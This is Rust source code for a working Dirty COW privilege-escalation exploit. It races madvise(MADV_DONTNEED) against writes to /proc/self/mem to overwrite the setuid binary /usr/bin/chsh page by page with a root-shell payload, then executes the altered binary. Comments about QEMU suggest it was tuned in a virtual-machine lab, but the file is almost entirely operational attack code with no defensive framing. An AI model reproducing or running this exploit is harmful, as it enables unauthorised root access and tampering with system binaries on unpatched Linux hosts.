use std::fs::{self, OpenOptions};
use std::io::{Read, Seek, SeekFrom, Write};
use std::os::unix::fs::MetadataExt;
use std::os::unix::io::AsRawFd;
use std::path::Path;
use std::process::Command;
use std::ptr;
use std::sync::{
    atomic::{AtomicBool, AtomicU64, Ordering},
    Arc,
};
use std::thread;
use std::time::{Duration, Instant};

const PAGE_SIZE: usize = 4096;

struct ChunkResult {
    offset: usize,
    size: usize,
    landed: bool,
    madvise_count: u64,
    write_count: u64,
}

// Racy one 4KB chunk at a time
fn dirtycow_chunk(
    target_path: &str,
    offset: usize,
    chunk: &[u8],
    timeout: Duration,
) -> std::io::Result<ChunkResult> {
    println!("[*] Chunking: Offset={} Size={} Timeout={}ms", offset, chunk.len(), timeout.as_millis());

    // HARD ALIGNMENT CHECK: Necessary for kernel stability
    if offset % PAGE_SIZE != 0 {
        return Err(std::io::Error::new(std::io::ErrorKind::InvalidInput, "Offset must be page-aligned"));
    }

    let file = OpenOptions::new().read(true).open(target_path)?;

    // Mapping exactly one page (or the remainder of the file)
    let map = unsafe {
        libc::mmap(
            ptr::null_mut(),
            chunk.len(),
            libc::PROT_READ,
            libc::MAP_PRIVATE,
            file.as_raw_fd(),
            offset as libc::off_t,
        )
    };

    if map == libc::MAP_FAILED {
        return Err(std::io::Error::last_os_error());
    }

    let running = Arc::new(AtomicBool::new(true));
    let madvise_count = Arc::new(AtomicU64::new(0));
    let write_count = Arc::new(AtomicU64::new(0));
    let map_usize = map as usize;

    // --- Thread A: madvise pressure ---
    let r_mad = running.clone();
    let c_mad = madvise_count.clone();
    let chunk_len = chunk.len();
    let madvise_thread = thread::spawn(move || {
        let map_ptr = map_usize as *mut libc::c_void;
        while r_mad.load(Ordering::SeqCst) {
            unsafe { libc::madvise(map_ptr, chunk_len, libc::MADV_DONTNEED); }
            let count = c_mad.fetch_add(1, Ordering::Relaxed) + 1;
            thread::yield_now();
            if count % 50 == 0 { thread::sleep(Duration::from_micros(100)); }
        }
    });

    // --- Thread B: Gentler Writer ---
    let r_write = running.clone();
    let c_write = write_count.clone();
    let writer_chunk = chunk.to_vec();
    let writer_thread = thread::spawn(move || {
        let mut mem_file = OpenOptions::new().read(true).write(true).open("/proc/self/mem").unwrap();
        let mut local_writes = 0u64;
        while r_write.load(Ordering::SeqCst) {
            let _ = mem_file.seek(SeekFrom::Start(map_usize as u64));
            let _ = mem_file.write_all(&writer_chunk);
            local_writes += 1;
            c_write.fetch_add(1, Ordering::Relaxed);

            // ANALYSIS: Throttling here prevents the memory bus from saturating
            // and crashing the QEMU emulator.
            if local_writes % 100 == 0 {
                thread::yield_now();
                thread::sleep(Duration::from_micros(100));
            }
        }
    });

    // --- Monitor Loop ---
    let start = Instant::now();
    let mut landed = false;
    loop {
        if let Ok(mut check_file) = OpenOptions::new().read(true).open(target_path) {
            let mut check_buf = vec![0u8; chunk.len()];
            if check_file.seek(SeekFrom::Start(offset as u64)).is_ok()
                && check_file.read_exact(&mut check_buf).is_ok()
                && check_buf == chunk
            {
                running.store(false, Ordering::SeqCst);
                landed = true;
                break;
            }
        }
        if start.elapsed() > timeout {
            running.store(false, Ordering::SeqCst);
            break;
        }
        thread::sleep(Duration::from_millis(1));
    }

    let _ = madvise_thread.join();
    let _ = writer_thread.join();

    unsafe {
        libc::munmap(map, chunk.len());
        // ANALYSIS: Flush this specific chunk's changes to disk
        libc::sync();
    }

    Ok(ChunkResult {
        offset,
        size: chunk.len(),
        landed,
        madvise_count: madvise_count.load(Ordering::Relaxed),
        write_count: write_count.load(Ordering::Relaxed),
    })
}

fn main() -> std::io::Result<()> {
    let target_path = "/usr/bin/chsh";
    let payload_path = "./rootsh_payload";
    let backup_path = "/tmp/chsh.dirtycow.backup";
    let chunk_timeout = Duration::from_secs(5);

    // Initial validation and backup...
    let payload = fs::read(payload_path)?;
    let payload_len = payload.len();
    fs::copy(target_path, backup_path)?;
    println!("[*] Target backed up to {}", backup_path);

    // Iterate through the payload in 4KB chunks
    let mut all_landed = true;
    for offset in (0..payload_len).step_by(PAGE_SIZE) {
        let end = std::cmp::min(offset + PAGE_SIZE, payload_len);
        let chunk = &payload[offset..end];

        let result = dirtycow_chunk(target_path, offset, chunk, chunk_timeout)?;

        if !result.landed {
            all_landed = false;
            break;
        }
        // Let the VM settle between bursts
        thread::sleep(Duration::from_millis(250));
    }

    unsafe { libc::sync(); }

    if all_landed {
        println!("[+] Full payload verified. Executing target...");
        let _ = Command::new(target_path).status()?;
    } else {
        eprintln!("[-] Exploit failed to land all chunks. Restore from backup.");
    }

    Ok(())
}